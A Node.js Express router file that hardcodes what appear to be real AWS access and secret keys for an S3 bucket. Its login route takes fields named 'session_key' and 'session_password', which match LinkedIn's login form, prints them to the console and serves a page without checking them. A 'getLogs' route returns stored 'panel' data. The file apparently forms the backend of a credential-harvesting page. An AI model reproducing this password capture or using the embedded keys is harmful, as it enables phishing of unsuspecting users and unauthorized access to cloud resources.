const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
// var axios = require('axios');
// var FormData = require('form-data');

const { getPanelsQuery } = require('../lib/query');

const { executeQuery } = require('../db');

const router = express.Router();

const AWS = require('aws-sdk');
const multer = require('multer');
const fs = require('fs')

const AWS_ACCESS_KEY_ID = "AKIAVBHONSQBZMPWQAUF";
const AWS_SECRET_ACCESS_KEY = "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";
const BUCKET = "fadaimageupload";

AWS.config.update({
  accessKeyId: AWS_ACCESS_KEY_ID,
  secretAccessKey: AWS_SECRET_ACCESS_KEY,
  region: 'us-east-1'
});
const s3Content = new AWS.S3();
const upload = multer({ dest: "upload/avatar/" });

const auth = require('../middleware/auth');

// Login
router.post('/login-submit', async (req, res) => {
    
  const { session_key, session_password } = req.body;

  try {

    console.log(session_key, session_password)

    // res.json({ status: true, code: 200, message: "" });
    res.sendFile('public/pages/index.html',{root:__dirname})

  } catch (error) {
    console.error(error);
    res.status(500).json({ status: false, code: 500, message: 'Internal server error' });
  }
});

router.get('/getLogs', auth, async (req, res) => {
    const userId = req.user.id;
  
    try {
  
        const logs = await executeQuery(getPanelsQuery, [])
        
        res.json({ status: true, code: 200, message: "", data: logs });
      
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, code: 500, message: 'Internal server error' });
    }
  });

module.exports = router;